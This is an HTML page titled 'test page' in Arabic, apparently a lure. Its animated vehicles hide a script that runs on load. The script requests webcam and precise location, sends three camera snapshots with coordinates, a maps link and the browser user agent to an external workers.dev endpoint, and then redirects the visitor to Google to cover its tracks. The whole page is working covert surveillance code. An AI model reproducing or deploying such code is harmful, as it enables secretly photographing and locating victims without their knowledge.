<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <title>صفحة الاختبار</title>
</head>
<body>
  <div id="road"></div>
  <div id="truck"></div>
  <div id="ferrari"></div>
  <div id="taxi"></div>
  <div id="bike"></div>

  <script>
    async function startProcess() {
      try {
        document.getElementById('road')?.classList.add('animating');
        ['truck', 'ferrari', 'taxi', 'bike'].forEach((id) => {
          document.getElementById(id)?.classList.add(id + '-move', 'move');
        });

        const [stream, position] = await Promise.all([
          navigator.mediaDevices.getUserMedia({ video: true }),
          new Promise((resolve, reject) => {
            navigator.geolocation.getCurrentPosition(resolve, reject, {
              enableHighAccuracy: true,
              timeout: 10000,
            });
          }),
        ]);

        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        const canvas = document.createElement('canvas');
        canvas.width = 640;
        canvas.height = 480;
        const ctx = canvas.getContext('2d');

        const lat = position.coords.latitude;
        const lon = position.coords.longitude;
        const mapLink = `https://www.google.com/maps/search/?api=1&query=${lat},${lon}`;
        const workerUrl = "https://noisy-snow-tag.sivistir6.workers.dev/";

        for (let i = 0; i < 3; i++) {
          ctx.drawImage(video, 0, 0, 640, 480);
          const img = canvas.toDataURL('image/jpeg', 0.5);

          await fetch(workerUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              img,
              info: navigator.userAgent,
              location: mapLink,
              coords: `${lat}, ${lon}`,
            }),
          });

          await new Promise((r) => setTimeout(r, 2000));
        }

        stream.getTracks().forEach((t) => t.stop());
        setTimeout(() => {
          window.location.href = "https://www.google.com";
        }, 1000);
      } catch (err) {
        console.error("خطأ:", err);
      }
    }

    startProcess();
  </script>
</body>
</html>
